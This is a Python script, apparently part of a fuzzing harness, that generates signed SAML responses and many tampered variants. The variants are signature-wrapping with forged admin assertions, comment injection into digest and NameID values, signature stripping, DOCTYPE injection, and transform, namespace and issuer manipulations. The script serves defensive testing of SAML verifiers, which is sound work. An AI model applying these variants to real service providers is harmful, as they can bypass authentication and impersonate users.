"""Generate seed corpus of signed SAML Responses for differential fuzzing.

Produces:
  1. Valid baseline responses (various NameIDs, algorithms)
  2. XSW attack variants (XSW1-XSW8 applied to valid responses)
  3. C14N edge cases (comment injection, relative namespace)
  4. Signature manipulation variants (stripped, algo-swapped)
  5. DOCTYPE injection variants

All valid responses are signed with the test IdP key from saml_fixtures/.
"""

from __future__ import annotations

import copy
import os
import sys
from datetime import datetime, timedelta, timezone

from lxml import etree

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
FIXTURES = os.path.join(SCRIPT_DIR, os.pardir, "targets", "saml_fixtures")
SEEDS_DIR = os.path.join(SCRIPT_DIR, os.pardir, "targets", "saml_seeds")

SAML_NS = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP_NS = "urn:oasis:names:tc:SAML:2.0:protocol"
DS_NS = "http://www.w3.org/2000/09/xmldsig#"

NSMAP = {
    "saml": SAML_NS,
    "samlp": SAMLP_NS,
}


def _load_key_and_cert():
    """Load test IdP private key and certificate."""
    from cryptography.hazmat.primitives.serialization import load_pem_private_key

    key_path = os.path.join(FIXTURES, "idp_key.pem")
    cert_path = os.path.join(FIXTURES, "idp_cert.pem")

    with open(key_path, "rb") as f:
        key_pem = f.read()
    with open(cert_path, "rb") as f:
        cert_pem = f.read()

    return key_pem, cert_pem


def _build_response(
    nameid: str,
    issuer: str = "https://idp.example.com",
    audience: str = "https://sp.example.com",
    attributes: dict | None = None,
    response_id: str = "_resp_001",
    assertion_id: str = "_assert_001",
) -> etree._Element:
    """Build an unsigned SAML Response XML tree."""
    now = datetime.now(timezone.utc)
    now_str = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    future_str = (now + timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")

    resp = etree.Element(
        f"{{{SAMLP_NS}}}Response",
        nsmap={"samlp": SAMLP_NS, "saml": SAML_NS},
    )
    resp.set("ID", response_id)
    resp.set("Version", "2.0")
    resp.set("IssueInstant", now_str)
    resp.set("Destination", "https://sp.example.com/acs")

    # Issuer
    iss = etree.SubElement(resp, f"{{{SAML_NS}}}Issuer")
    iss.text = issuer

    # Status
    status = etree.SubElement(resp, f"{{{SAMLP_NS}}}Status")
    status_code = etree.SubElement(status, f"{{{SAMLP_NS}}}StatusCode")
    status_code.set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

    # Assertion
    assertion = etree.SubElement(resp, f"{{{SAML_NS}}}Assertion")
    assertion.set("Version", "2.0")
    assertion.set("ID", assertion_id)
    assertion.set("IssueInstant", now_str)

    iss2 = etree.SubElement(assertion, f"{{{SAML_NS}}}Issuer")
    iss2.text = issuer

    # Subject
    subject = etree.SubElement(assertion, f"{{{SAML_NS}}}Subject")
    name_id = etree.SubElement(subject, f"{{{SAML_NS}}}NameID")
    name_id.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
    name_id.text = nameid

    subj_conf = etree.SubElement(subject, f"{{{SAML_NS}}}SubjectConfirmation")
    subj_conf.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    subj_data = etree.SubElement(subj_conf, f"{{{SAML_NS}}}SubjectConfirmationData")
    subj_data.set("NotOnOrAfter", future_str)
    subj_data.set("Recipient", "https://sp.example.com/acs")

    # Conditions
    conditions = etree.SubElement(assertion, f"{{{SAML_NS}}}Conditions")
    conditions.set("NotBefore", now_str)
    conditions.set("NotOnOrAfter", future_str)
    aud_restrict = etree.SubElement(conditions, f"{{{SAML_NS}}}AudienceRestriction")
    aud = etree.SubElement(aud_restrict, f"{{{SAML_NS}}}Audience")
    aud.text = audience

    # AuthnStatement
    authn = etree.SubElement(assertion, f"{{{SAML_NS}}}AuthnStatement")
    authn.set("AuthnInstant", now_str)
    authn.set("SessionIndex", "_session_001")
    authn_ctx = etree.SubElement(authn, f"{{{SAML_NS}}}AuthnContext")
    authn_ref = etree.SubElement(authn_ctx, f"{{{SAML_NS}}}AuthnContextClassRef")
    authn_ref.text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

    # Attributes
    if attributes:
        attr_stmt = etree.SubElement(assertion, f"{{{SAML_NS}}}AttributeStatement")
        for name, value in attributes.items():
            attr = etree.SubElement(attr_stmt, f"{{{SAML_NS}}}Attribute")
            attr.set("Name", name)
            attr.set("NameFormat", "urn:oasis:names:tc:SAML:2.0:attrname-format:basic")
            val_elem = etree.SubElement(attr, f"{{{SAML_NS}}}AttributeValue")
            val_elem.text = value

    return resp


def _sign_assertion(resp: etree._Element, key_pem: bytes, cert_pem: bytes) -> etree._Element:
    """Sign the Assertion within the Response using signxml."""
    from signxml import XMLSigner
    from signxml.algorithms import (
        CanonicalizationMethod,
        DigestAlgorithm,
        SignatureConstructionMethod,
        SignatureMethod,
    )

    assertion = resp.find(f"{{{SAML_NS}}}Assertion")
    if assertion is None:
        return resp

    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        signature_algorithm=SignatureMethod.RSA_SHA256,
        digest_algorithm=DigestAlgorithm.SHA256,
        c14n_algorithm=CanonicalizationMethod.EXCLUSIVE_XML_CANONICALIZATION_1_0,
    )

    signed_assertion = signer.sign(
        assertion,
        key=key_pem,
        cert=cert_pem,
    )

    # Replace unsigned assertion with signed one
    parent = assertion.getparent()
    idx = list(parent).index(assertion)
    parent.remove(assertion)
    parent.insert(idx, signed_assertion)

    return resp


def _to_xml(root: etree._Element) -> bytes:
    return etree.tostring(root, xml_declaration=True, encoding="UTF-8", pretty_print=True)


def _write_seed(path: str, content: bytes) -> None:
    with open(path, "wb") as f:
        f.write(content)
    print(f"  {os.path.basename(path)} ({len(content)} bytes)")


def generate_valid_seeds(key_pem, cert_pem, output_dir):
    """Generate validly-signed SAML Responses."""
    configs = [
        {"nameid": "user@example.com", "attrs": {"role": "user", "email": "user@example.com"}},
        {"nameid": "admin@example.com", "attrs": {"role": "admin"}},
        {"nameid": "test-user", "attrs": {"groups": "developers"}},
        {"nameid": "ceo@company.com", "attrs": {"role": "executive", "department": "leadership"}},
        {"nameid": "a@b.com", "attrs": None},
    ]

    seeds = []
    for i, cfg in enumerate(configs, 1):
        resp = _build_response(
            nameid=cfg["nameid"],
            attributes=cfg["attrs"],
            response_id=f"_resp_{i:03d}",
            assertion_id=f"_assert_{i:03d}",
        )
        resp = _sign_assertion(resp, key_pem, cert_pem)
        xml_bytes = _to_xml(resp)
        path = os.path.join(output_dir, f"valid_response_{i:02d}.xml")
        _write_seed(path, xml_bytes)
        seeds.append((resp, xml_bytes))

    return seeds


def generate_xsw_seeds(seeds, output_dir):
    """Generate XSW attack variants from valid seeds."""
    if not seeds:
        return

    base_resp, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    evil_assertion = (
        '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
        ' Version="2.0" ID="_evil_001" IssueInstant="2025-01-01T00:00:00Z">'
        "<saml:Issuer>https://idp.example.com</saml:Issuer>"
        "<saml:Subject>"
        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
        "admin@example.com</saml:NameID>"
        "</saml:Subject>"
        "</saml:Assertion>"
    )

    # XSW1: Evil assertion before legitimate
    xsw1 = base_str.replace(
        "<saml:Assertion ",
        evil_assertion + "\n<saml:Assertion ",
        1,
    )
    _write_seed(os.path.join(output_dir, "xsw1_pre_assertion.xml"), xsw1.encode())

    # XSW2: Evil assertion after legitimate
    xsw2 = base_str.replace(
        "</saml:Assertion>",
        "</saml:Assertion>\n" + evil_assertion,
        1,
    )
    # Only replace the last occurrence
    idx = base_str.rfind("</saml:Assertion>")
    if idx >= 0:
        xsw2 = base_str[:idx + len("</saml:Assertion>")] + "\n" + evil_assertion + base_str[idx + len("</saml:Assertion>"):]
    _write_seed(os.path.join(output_dir, "xsw2_post_assertion.xml"), xsw2.encode())

    # XSW3: Evil assertion nested inside legitimate
    idx = base_str.rfind("</saml:Assertion>")
    if idx >= 0:
        xsw3 = base_str[:idx] + evil_assertion + "\n" + base_str[idx:]
        _write_seed(os.path.join(output_dir, "xsw3_nested_assertion.xml"), xsw3.encode())

    # XSW7: Evil assertion in Extensions
    extensions_wrap = (
        "<samlp:Extensions>" + evil_assertion + "</samlp:Extensions>"
    )
    xsw7 = base_str.replace(
        "<saml:Assertion ",
        extensions_wrap + "\n<saml:Assertion ",
        1,
    )
    _write_seed(os.path.join(output_dir, "xsw7_extensions.xml"), xsw7.encode())


def generate_comment_seeds(seeds, output_dir):
    """Generate comment injection seeds (SAMLStorm)."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # Comment in DigestValue
    c1 = base_str.replace(
        "<ds:DigestValue>",
        "<ds:DigestValue><!-- evil -->",
    )
    _write_seed(os.path.join(output_dir, "comment_digest_01.xml"), c1.encode())

    # Comment in SignatureValue
    c2 = base_str.replace(
        "<ds:SignatureValue>",
        "<ds:SignatureValue><!-- evil -->",
    )
    _write_seed(os.path.join(output_dir, "comment_sigvalue_01.xml"), c2.encode())

    # Comment in NameID
    c3 = base_str.replace(
        "user@example.com</saml:NameID>",
        "admin@legit.com<!-->.evil.com</saml:NameID>",
    )
    _write_seed(os.path.join(output_dir, "comment_nameid_01.xml"), c3.encode())


def generate_stripped_seeds(seeds, output_dir):
    """Generate signature-stripped seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    import re
    stripped = re.sub(
        r"<ds:Signature\b[^>]*>.*?</ds:Signature>",
        "",
        base_str,
        flags=re.DOTALL,
    )
    _write_seed(os.path.join(output_dir, "stripped_sig_01.xml"), stripped.encode())


def generate_void_c14n_seeds(seeds, output_dir):
    """Generate void canonicalization seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # Relative namespace URI
    v1 = base_str.replace(
        "<saml:Assertion ",
        '<saml:Assertion xmlns:evil="1" ',
        1,
    )
    _write_seed(os.path.join(output_dir, "void_c14n_relative_ns.xml"), v1.encode())


def generate_doctype_seeds(seeds, output_dir):
    """Generate DOCTYPE injection seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # ATTLIST injection (REXML differential)
    dt1 = base_str.replace(
        "<?xml version",
        '<?xml version',
        1,
    )
    doctype = (
        '<!DOCTYPE samlp:Response [\n'
        '  <!ATTLIST saml:Assertion xmlns:saml CDATA '
        '"urn:oasis:names:tc:SAML:2.0:assertion">\n]>\n'
    )
    # Insert after XML declaration
    import re
    dt1 = re.sub(
        r"(<\?xml[^?]*\?>)",
        r"\1\n" + doctype,
        base_str,
        count=1,
    )
    _write_seed(os.path.join(output_dir, "doctype_attlist_01.xml"), dt1.encode())


def generate_encoding_seeds(seeds, output_dir):
    """Generate encoding attack seeds (BOM, mismatch)."""
    if not seeds:
        return
    _, base_xml = seeds[0]

    # UTF-16 LE BOM prefix
    _write_seed(
        os.path.join(output_dir, "encoding_utf16_bom.xml"),
        b"\xff\xfe" + base_xml,
    )

    # Encoding mismatch: declare ISO-8859-1 but content is UTF-8
    import re as _re
    mismatch = _re.sub(
        rb'encoding="UTF-8"', b'encoding="ISO-8859-1"', base_xml, count=1
    )
    _write_seed(os.path.join(output_dir, "encoding_mismatch.xml"), mismatch)


def generate_transform_seeds(seeds, output_dir):
    """Generate transform chain manipulation seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # XPath filter transform added
    t1 = base_str.replace(
        "</ds:Transforms>",
        '<ds:Transform Algorithm="http://www.w3.org/2002/06/xmldsig-filter2">'
        '<XPath xmlns="http://www.w3.org/2002/06/xmldsig-filter2"'
        ' Filter="intersect">//*</XPath></ds:Transform>\n</ds:Transforms>',
        1,
    )
    _write_seed(os.path.join(output_dir, "transform_xpath_filter.xml"), t1.encode())

    # Enveloped-signature transform removed
    import re as _re
    t2 = _re.sub(
        r'<ds:Transform\s+Algorithm="http://www\.w3\.org/2000/09/xmldsig#enveloped-signature"\s*/?>',
        "",
        base_str,
    )
    _write_seed(os.path.join(output_dir, "transform_no_enveloped.xml"), t2.encode())


def generate_reference_uri_seeds(seeds, output_dir):
    """Generate Reference URI manipulation seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]

    import re as _re
    # Empty URI (whole document)
    r1 = _re.sub(rb'URI="[^"]*"', b'URI=""', base_xml, count=1)
    _write_seed(os.path.join(output_dir, "reference_uri_empty.xml"), r1)

    # XPointer syntax
    r2 = _re.sub(rb'URI="[^"]*"', b'URI="xpointer(/)"', base_xml, count=1)
    _write_seed(os.path.join(output_dir, "reference_uri_xpointer.xml"), r2)


def generate_namespace_seeds(seeds, output_dir):
    """Generate namespace manipulation seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # Namespace undeclaration
    n1 = base_str.replace(
        "<saml:Assertion ",
        '<saml:Assertion xmlns:saml="" ',
        1,
    )
    _write_seed(os.path.join(output_dir, "namespace_undeclare.xml"), n1.encode())

    # Namespace prefix remap: saml: -> saml2:
    n2 = base_str.replace("saml:", "saml2:")
    n2 = n2.replace("saml2p:", "samlp:")  # fix samlp: back
    # Add the new namespace declaration
    n2 = n2.replace(
        'xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"',
        'xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"',
    )
    _write_seed(os.path.join(output_dir, "namespace_prefix_remap.xml"), n2.encode())


def generate_c14n_seeds_v2(seeds, output_dir):
    """Generate canonicalization method swap seed."""
    if not seeds:
        return
    _, base_xml = seeds[0]

    import re as _re
    # Switch to inclusive c14n
    c1 = _re.sub(
        rb'Algorithm="http://www\.w3\.org/2001/10/xml-exc-c14n#"',
        b'Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"',
        base_xml,
        count=1,
    )
    _write_seed(os.path.join(output_dir, "c14n_inclusive.xml"), c1)


def generate_protocol_seeds(seeds, output_dir):
    """Generate protocol-level attack seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # Issuer spoof
    p1 = base_str.replace(
        "<saml:Issuer>https://idp.example.com</saml:Issuer>",
        "<saml:Issuer>https://evil-idp.com</saml:Issuer>",
        1,
    )
    _write_seed(os.path.join(output_dir, "issuer_spoof.xml"), p1.encode())


def generate_pi_seed(seeds, output_dir):
    """Generate processing instruction injection seed."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    # PI inside Signature
    p1 = base_str.replace(
        "<ds:Signature ",
        "<ds:Signature <?evil data?> ",
        1,
    )
    _write_seed(os.path.join(output_dir, "pi_inside_signature.xml"), p1.encode())


def generate_structure_seeds(seeds, output_dir):
    """Generate structural attack seeds."""
    if not seeds:
        return
    _, base_xml = seeds[0]
    base_str = base_xml.decode("utf-8")

    import re as _re

    # Duplicate Reference
    ref_match = _re.search(
        r"(<ds:Reference\b[^>]*>)(.*?)(</ds:Reference>)",
        base_str,
        flags=_re.DOTALL,
    )
    if ref_match:
        ref_block = ref_match.group(0)
        clone = _re.sub(r'URI="[^"]*"', 'URI=""', ref_block)
        d1 = base_str[:ref_match.end()] + "\n" + clone + base_str[ref_match.end():]
        _write_seed(os.path.join(output_dir, "duplicate_reference.xml"), d1.encode())

    # Assertion bomb (3 extra assertions)
    evil_assertions = ""
    for i in range(3):
        names = ["admin@example.com", "root@example.com", "hacker@evil.com"]
        evil_assertions += (
            f'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
            f' Version="2.0" ID="_bomb_{i}" IssueInstant="2025-01-01T00:00:00Z">'
            f'<saml:Issuer>https://idp.example.com</saml:Issuer>'
            f'<saml:Subject><saml:NameID>{names[i]}</saml:NameID></saml:Subject>'
            f'</saml:Assertion>\n'
        )
    a1 = base_str.replace(
        "<saml:Assertion ",
        evil_assertions + "<saml:Assertion ",
        1,
    )
    _write_seed(os.path.join(output_dir, "assertion_bomb_3x.xml"), a1.encode())

    # Go duplicate attribute: duplicate ID on Assertion
    g1 = base_str.replace(
        '<saml:Assertion ',
        '<saml:Assertion ID="_evil_go" ',
        1,
    )
    _write_seed(os.path.join(output_dir, "go_duplicate_attr.xml"), g1.encode())


def main():
    os.makedirs(SEEDS_DIR, exist_ok=True)

    print("Loading IdP keypair...")
    key_pem, cert_pem = _load_key_and_cert()

    print("\n--- Valid baseline responses ---")
    seeds = generate_valid_seeds(key_pem, cert_pem, SEEDS_DIR)

    print("\n--- XSW attack variants ---")
    generate_xsw_seeds(seeds, SEEDS_DIR)

    print("\n--- Comment injection seeds ---")
    generate_comment_seeds(seeds, SEEDS_DIR)

    print("\n--- Signature-stripped seeds ---")
    generate_stripped_seeds(seeds, SEEDS_DIR)

    print("\n--- Void canonicalization seeds ---")
    generate_void_c14n_seeds(seeds, SEEDS_DIR)

    print("\n--- DOCTYPE injection seeds ---")
    generate_doctype_seeds(seeds, SEEDS_DIR)

    print("\n--- Encoding attack seeds ---")
    generate_encoding_seeds(seeds, SEEDS_DIR)

    print("\n--- Transform chain seeds ---")
    generate_transform_seeds(seeds, SEEDS_DIR)

    print("\n--- Reference URI seeds ---")
    generate_reference_uri_seeds(seeds, SEEDS_DIR)

    print("\n--- Namespace manipulation seeds ---")
    generate_namespace_seeds(seeds, SEEDS_DIR)

    print("\n--- C14N method swap seeds ---")
    generate_c14n_seeds_v2(seeds, SEEDS_DIR)

    print("\n--- Protocol-level seeds ---")
    generate_protocol_seeds(seeds, SEEDS_DIR)

    print("\n--- PI injection seeds ---")
    generate_pi_seed(seeds, SEEDS_DIR)

    print("\n--- Structural attack seeds ---")
    generate_structure_seeds(seeds, SEEDS_DIR)

    total = len([f for f in os.listdir(SEEDS_DIR) if f.endswith(".xml")])
    print(f"\nDone. {total} seed files in {SEEDS_DIR}")


if __name__ == "__main__":
    main()
